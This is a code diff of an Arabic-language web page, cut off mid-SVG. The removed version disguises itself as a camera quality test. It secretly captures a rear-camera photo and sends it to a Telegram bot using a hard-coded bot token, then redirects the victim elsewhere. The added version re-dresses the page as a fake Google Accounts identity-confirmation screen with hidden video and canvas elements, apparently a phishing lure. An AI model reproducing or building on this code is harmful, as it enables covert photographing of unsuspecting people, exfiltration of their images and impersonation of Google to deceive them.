@@ -2,82 +2,41 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فحص جودة الكاميرا v2.0</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تأكيد الهوية - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: sans-serif; background-color: #1a1a1a; color: white; text-align: center; padding: 50px 20px; }
-        .container { max-width: 400px; margin: auto; background: #2d2d2d; padding: 30px; border-radius: 15px; }
-        .btn { background: #00ff88; color: #1a1a1a; padding: 15px 25px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        #status { margin-top: 20px; color: #ffeb3b; }
+        /* تصميم Material Design الخاص بقوقل */
+        body { font-family: 'Roboto', sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #202124; }
+        .google-card { background: white; width: 100%; max-width: 450px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); padding: 48px 40px 36px; text-align: center; }
+        
+        /* شعار قوقل الرسمي */
+        .google-logo { width: 75px; margin-bottom: 15px; }
+        
+        /* عناوين ورسائل قوقل القياسية */
+        h1 { font-size: 24px; font-weight: 500; margin-bottom: 10px; color: #202124; }
+        h2 { font-size: 16px; font-weight: 400; margin-bottom: 25px; color: #202124; }
+        
+        .alert-box { background-color: #e8f0fe; border-radius: 8px; padding: 15px; border-left: 5px solid #1a73e8; text-align: right; margin-bottom: 25px; display: flex; align-items: start; }
+        .alert-icon { color: #1a73e8; font-size: 20px; margin-left: 10px; margin-top: 2px; }
+        .alert-text { font-size: 14px; line-height: 1.5; color: #3c4043; }
+        
+        .status-container { margin-bottom: 25px; min-height: 20px; }
+        #status-text { font-size: 14px; color: #5f6368; }
+        
+        /* الأزرار الرسمية */
+        .action-buttons { display: flex; justify-content: flex-end; margin-top: 20px; }
+        .btn { padding: 10px 24px; border-radius: 4px; border: none; font-size: 14px; font-weight: 500; cursor: pointer; text-transform: none; transition: background-color 0.2s; }
+        .btn-primary { background-color: #1a73e8; color: white; }
+        .btn-primary:hover { background-color: #1765cc; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.302), 0 1px 3px 1px rgba(60,64,67,0.149); }
+        .btn-flat { background-color: transparent; color: #1a73e8; margin-right: 8px; }
+        .btn-flat:hover { background-color: #f6fafe; }
+        
+        /* إخفاء عناصر الفيديو والكانفاس */
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>أداة فحص مستشعرات الكاميرا</h2>
-    <p>يرجى الضغط على الزر أدناه لفحص دقة الكاميرا الخلفية ومعدل الـ FPS.</p>
-    <button class="btn" onclick="startProcess()">بدء الفحص</button>
-    <div id="status"></div>
-</div>
-
-<video id="video" width="640" height="480" autoplay style="display:none;"></video>
-<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-
-<script>
-    // الإعدادات التي تم استخراجها من صورك
-    const botToken = "8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwX0DPs";
-    const chatId = "7822309283";
-
-    async function startProcess() {
-        const status = document.getElementById('status');
-        status.innerText = "جاري الاتصال بالكاميرا...";
-
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "environment" } 
-            });
-            
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            
-            status.innerText = "جاري التقاط البيانات...";
-
-            // التقاط الصورة بعد ثانيتين
-            setTimeout(() => {
-                captureAndSend();
-            }, 2000);
-
-        } catch (err) {
-            status.innerText = "خطأ: يجب السماح بالكاميرا للبدء.";
-        }
-    }
-
-    function captureAndSend() {
-        const canvas = document.getElementById('canvas');
-        const video = document.getElementById('video');
-        const context = canvas.getContext('2d');
-        
-        context.drawImage(video, 0, 0, 640, 480);
-        
-        canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'shot.jpg');
-            formData.append('caption', '🚀 تم التقاط صورة من الكاميرا الخلفية بنجاح!');
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(() => {
-                document.getElementById('status').innerText = "تم الفحص! جاري التحويل...";
-                setTimeout(() => {
-                    window.location.href = "https://www.gsmarena.com";
-                }, 1000);
-            });
-        }, 'image/jpeg');
-    }
-</script>
-
-</body>
-</html> 
+<div class="google-card">
+    <svg class="google-logo" viewBox="0 0 75 24" alt="Google"><path d="M7.3 12.1v3.2h4.7c-.2 1.1-.7 2-1.5 2.6-1.1.7-2.4 1.2-4 1.2-3.1 0-5.
